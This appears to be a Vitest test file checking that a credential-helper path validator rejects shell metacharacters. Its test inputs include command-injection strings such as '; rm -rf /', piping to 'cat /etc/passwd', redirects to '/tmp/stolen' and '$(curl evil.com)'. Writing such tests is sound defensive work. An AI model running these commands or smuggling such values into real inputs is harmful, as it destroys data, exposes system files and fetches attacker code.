import { describe, it, expect } from 'vitest'
import { validateHelperPath, SHELL_METACHARACTERS } from './authValidation.js'

describe('SHELL_METACHARACTERS', () => {
  const dangerous = [';', '&', '|', '`', '$', '<', '>', '(', ')', '\n', '\r', "'", '"', '\\']

  for (const char of dangerous) {
    const label = char === '\n' ? '\\n' : char === '\r' ? '\\r' : char
    it(`matches dangerous character: ${label}`, () => {
      expect(SHELL_METACHARACTERS.test(`safe${char}path`)).toBe(true)
    })
  }

  it('does not match safe absolute paths', () => {
    expect(SHELL_METACHARACTERS.test('/usr/bin/my-helper')).toBe(false)
  })

  it('does not match simple names', () => {
    expect(SHELL_METACHARACTERS.test('my-credential-helper')).toBe(false)
  })

  it('does not match paths with dots and hyphens', () => {
    expect(SHELL_METACHARACTERS.test('/opt/tools/aws-cred-v2.3')).toBe(false)
  })
})

describe('validateHelperPath', () => {
  it('throws when path is undefined', () => {
    expect(() => validateHelperPath(undefined)).toThrow('Helper path is required')
  })

  it('throws when path is empty string', () => {
    expect(() => validateHelperPath('')).toThrow('Helper path is required')
  })

  it('returns the path for a valid absolute path', () => {
    expect(validateHelperPath('/usr/bin/helper')).toBe('/usr/bin/helper')
  })

  it('returns the path for a simple name', () => {
    expect(validateHelperPath('my-helper')).toBe('my-helper')
  })

  it('rejects semicolon (command chaining)', () => {
    expect(() => validateHelperPath('/bin/helper; rm -rf /')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects ampersand (background execution)', () => {
    expect(() => validateHelperPath('helper & malicious')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects pipe (command piping)', () => {
    expect(() => validateHelperPath('helper | cat /etc/passwd')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects backtick (command substitution)', () => {
    expect(() => validateHelperPath('`malicious`')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects dollar sign (variable expansion)', () => {
    expect(() => validateHelperPath('helper$PATH')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects single quotes', () => {
    expect(() => validateHelperPath("helper'injected")).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects double quotes', () => {
    expect(() => validateHelperPath('helper"injected')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects newlines', () => {
    expect(() => validateHelperPath('helper\nmalicious')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects carriage returns', () => {
    expect(() => validateHelperPath('helper\rmalicious')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects backslash (escape sequences)', () => {
    expect(() => validateHelperPath('helper\\injected')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects redirect operators', () => {
    expect(() => validateHelperPath('helper > /tmp/stolen')).toThrow(
      'shell metacharacters',
    )
    expect(() => validateHelperPath('helper < /etc/passwd')).toThrow(
      'shell metacharacters',
    )
  })

  it('rejects subshell syntax', () => {
    expect(() => validateHelperPath('$(curl evil.com)')).toThrow(
      'shell metacharacters',
    )
  })
})
